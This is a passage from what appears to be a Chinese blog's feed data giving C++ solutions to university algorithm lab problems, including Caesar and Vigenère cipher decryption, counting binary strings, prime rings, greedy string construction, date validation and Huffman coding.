class="keyword">if</span>(s[i]&gt;=<span class="string">'a'</span>&amp;&amp;s[i]&lt;=<span class="string">'z'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s[i]=s[i]-k;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&lt;<span class="string">'a'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]+<span class="number">26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s[i]&gt;<span class="string">'z'</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    s[i]=s[i]<span class="number">-26</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-Vigenere-密码"><a href="#问题-B-Vigenere-密码" class="headerlink" title="问题 B: Vigenère 密码"></a><strong>问题 B: Vigenère 密码</strong></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>16 世纪法国外交家 Blaise de Vigenère 设计了一种多表密码加密算法——Vigenère 密码。Vigenère 密码的加密解密算法简单易用，且破译难度比较高，曾在美国南北战争中为南军所广泛使用。</p><p>在密码学中，我们称需要加密的信息为明文，用 M<em>M</em> 表示；称加密后的信息为密文，用 C<em>C</em> 表示；而密钥是一种参数，是将明文转换为密文或将密文转换为明文的算法中输入的数据，记为 k<em>k</em>。 在 Vigenère 密码中，密钥 k<em>k</em> 是一个字母串，<em>k</em>=<em>k1k2…kn</em>。当明文 M = m1m2…mn 时，得到的密文 C = c1c2…cn ，其中 ci = mi ® ki，运算 ® 的规则如下表所示：</p><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180910/20180910173109_58996.png" alt="img"></p><p>Vigenère 加密在操作时需要注意：</p><ol><li>® 运算忽略参与运算的字母的大小写，并保持字母在明文 M<em>M</em> 中的大小写形式；</li><li>当明文 M<em>M</em> 的长度大于密钥 k<em>k</em> 的长度时，将密钥 k<em>k</em> 重复使用。 例如，明文 M=<em>M</em>=Helloworld，密钥 k=<em>k</em>=abc时，密文 C=<em>C</em>=Hfnlpyosnd。</li></ol><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180910/20180910173353_81009.png" alt="img"></p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第一行为一个字符串，表示密钥 k<em>k</em>，长度不超过 100100，其中仅包含大小写字母。</p><p>第二行为一个字符串，表示经加密后的密文，长度不超过 10001000，其中仅包含大小写字母。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>输出共 11 行，一个字符串，表示输入密钥和密文所对应的明文。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CompleteVictory</span><br><span class="line">Yvqgpxaimmklongnzfwpvxmniytm</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wherethereisawillthereisaway</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> k[<span class="number">102</span>],c[<span class="number">1002</span>];</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">char</span> temp; </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;c;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;c[j]!=<span class="string">'\0'</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(c[j]&gt;=<span class="string">'A'</span>&amp;&amp;c[j]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">            <span class="keyword">if</span>(k[i]&gt;=<span class="string">'A'</span>&amp;&amp;k[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">                temp=(c[j]-<span class="string">'A'</span>-(k[i]-<span class="string">'A'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'A'</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                temp=(c[j]-<span class="string">'A'</span>-(k[i]-<span class="string">'a'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'A'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(k[i]&gt;=<span class="string">'A'</span>&amp;&amp;k[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">                temp=(c[j]-<span class="string">'a'</span>-(k[i]-<span class="string">'A'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'a'</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                temp=(c[j]-<span class="string">'a'</span>-(k[i]-<span class="string">'a'</span>)+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">'a'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;temp;</span><br><span class="line">        i++;</span><br><span class="line">         <span class="keyword">if</span>(k[i]==<span class="string">'\0'</span>) i=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-简单的密码"><a href="#问题-C-简单的密码" class="headerlink" title="问题 C: 简单的密码"></a>问题 C: 简单的密码</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>密码是按特定法则编成，用以对通信双方的信息进行明密变换的符号。密码是隐蔽了真实内容的符号序列。其实就是把用公开的、标准的信息编码表示的信息通过一种变换手段，将其变为除通信双方以外其他人所不能读懂的信息编码，这种独特的信息编码就是密码。<br>现在我们定义一种非常简单的密码，它的长度固定为n（n&lt;=30）并且每一位只能由数字0或者数字1组成，但是有一个特殊的要求：一个密码序列中至少要有连续的3个0出现才可以，否则就是无效的。现在给定你密码序列的长度n，你的任务是计算长度为n的序列能产生多少种不同的并且有效的密码？</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组数据，每组数据只有一个正整数n（1&lt;=n&lt;=30）代表密码序列的长度，单独占一行。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>对每组数据，输出一个整数，代表长度为n的序列能产生的不同密码的种类数。</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">8</span><br><span class="line">20</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">32</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">20</span>,<span class="number">47</span>,<span class="number">107</span>,<span class="number">238</span>,<span class="number">520</span>,<span class="number">1121</span>,<span class="number">2391</span>,<span class="number">5056</span>,<span class="number">10616</span>,<span class="number">22159</span>,<span class="number">46023</span>,<span class="number">95182</span>,<span class="number">196132</span>,<span class="number">402873</span>,<span class="number">825259</span>,<span class="number">1686408</span>,<span class="number">3438828</span>,<span class="number">6999071</span>,<span class="number">14221459</span>,<span class="number">28853662</span>,<span class="number">58462800</span>,<span class="number">118315137</span>,<span class="number">239186031</span>,<span class="number">483072832</span>,<span class="number">974791728</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;dp[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-有趣的素数"><a href="#问题-D-有趣的素数" class="headerlink" title="问题 D: 有趣的素数"></a>问题 D: 有趣的素数</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>素数被广泛地应用于密码学中，所谓的公钥就是将想要传递的信息在编码时加入砠数，编码之后传给收信人，任何人收到此信息之后，若没有此收信人所拥有的秘钥，则在解密的过程中将会因为分解质因数过久而无法破解信息，可见素数在密码学中的重要性。<br>现在给你n（2&lt;=n&lt;=16）个正整数1,2,3…n，你的任务是把这n个正整数组成一个环，使得任意相邻的两个整数之和为一个素数，输出有多少种合法方案。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>多组输入数据，每组数据只有一个正整数n（2&lt;=n&lt;=16）代表有n个正整数 1,2,3…n</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对每组数据，输出一个整数，代表有多少种不同的可行方案数。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure><h2 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h2><p>对于输入样例中的6，有以下2种合法方案（首尾相连构成一个环）</p><p>1 4 3 2 5 6</p><p>1 6 5 2 3 4</p><p>对于输入样例中的8，有以下4种合法方案（首尾相连构成一个环）</p><p>1 2 3 8 5 6 7 4</p><p>1 2 5 8 3 4 7 6</p><p>1 4 7 6 5 8 3 2</p><p>1 6 7 4 3 8 5 2</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans,last;</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">32</span>];</span><br><span class="line"><span class="keyword">bool</span> isPrime[<span class="number">40</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pc</span><span class="params">(<span class="keyword">int</span> cur)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur == n &amp;&amp; isPrime[<span class="number">1</span>+last])</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i] &amp;&amp; isPrime[last+i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> t = last;</span><br><span class="line">            last = i;</span><br><span class="line">            visited[i] = <span class="literal">true</span>;</span><br><span class="line">            pc(cur+<span class="number">1</span>);</span><br><span class="line">            visited[i] = <span class="literal">false</span>;</span><br><span class="line">            last = t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visited,<span class="number">0</span>,<span class="keyword">sizeof</span>(visited));</span><br><span class="line">        ans = <span class="number">0</span>;</span><br><span class="line">        last = <span class="number">1</span>;</span><br><span class="line">        pc(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-数据加密"><a href="#问题-E-数据加密" class="headerlink" title="问题 E: 数据加密"></a>问题 E: 数据加密</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>密码学是研究编制密码和破译密码的技术科学。研究密码变化的客观规律，应用于编制密码以保守通信秘密的，称为编码学；应用于破译密码以获取通信情报的，称为破译学，总称密码学。密码是通信双方按约定的法则进行信息特殊变换的一种重要保密手段。依照这些法则，变明文为密文，称为加密变换；变密文为明文，称为脱密变换。密码在早期仅对文字或数码进行加、脱密变换，随着通信技术的发展，对语音、图像、数据等都可实施加、脱密变换。<br>现在要求你用下面给定的方法对数据实现加密。给定长度为n的字符串S（1&lt;=n&lt;=2000,S中只有大写字母）作为明文，要求构造一个字符串T作为密文，起初T是一个空串，之后反复执行以下任意操作</p><p>1.从S的头部删除一个字符，加入到T的尾部<br>2.从S的尾部删除一个字符，加入到T的尾部</p><p>最后S会变成空串，T会变成一个长度为n的字符串作为密文。当然并非所有的构造方案都是符合条件的，我们要求构造出的密文T的字典序尽可能小，你能找出这个字典序最小的密文吗？</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组数据，每组数据占两行，第一行为一个整数n（1&lt;=n&lt;=2000）代表字符串S的长度，第二行为一个长度为n的字符串S代表明文，保证S中只有大写字母</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对每组数据，输出一行字符串，代表构造出的字典序最小的密文T</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">ACDBCB</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCBCD</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>字典序是指从前往后比较两个字符串大小的方法。首先比较第1个字符，如果不同则第1个字符更小的字符串更小，如果相同则继续比较第2个字符……如此继续，来比较整个字符串的大小</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">2005</span>],ans[<span class="number">2005</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;str;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>,j = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; i+k &lt; j-k; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(str[i+k] &lt; str[j-k])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(str[i+k] &gt; str[j-k]) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) </span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;str[i++];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;str[j--];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法实验（四）</title>
      <link href="/2019/10/25/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C4/"/>
      <url>/2019/10/25/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C4/</url>
      
        <content type="html"><![CDATA[<p>算法实验四。</p><a id="more"></a><h2 id="问题-A-判断日期是否符合格式"><a href="#问题-A-判断日期是否符合格式" class="headerlink" title="问题 A: 判断日期是否符合格式"></a>问题 A: 判断日期是否符合格式</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。</p><p>提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例，对每组测试用例：</p><p>用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011 21 10</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> days[<span class="number">13</span>] = &#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLeap</span><span class="params">(<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(y%<span class="number">400</span> == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(y%<span class="number">4</span> == <span class="number">0</span> &amp;&amp; y%<span class="number">100</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y,m,d;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;y&gt;&gt;m&gt;&gt;d)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = isLeap(y);</span><br><span class="line">        <span class="keyword">if</span>(m &lt;= <span class="number">0</span> || m &gt; <span class="number">12</span> || d &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"0"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> dd = days[m];</span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">2</span> &amp;&amp; flag) </span><br><span class="line">            dd++;</span><br><span class="line">        <span class="keyword">if</span>(d &lt;= dd)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"1"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"0"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-哈夫曼编码"><a href="#问题-B-哈夫曼编码" class="headerlink" title="问题 B: 哈夫曼编码"></a>问题 B: 哈夫曼编码</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>对于每个字符串，输出其哈夫曼编码长度</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 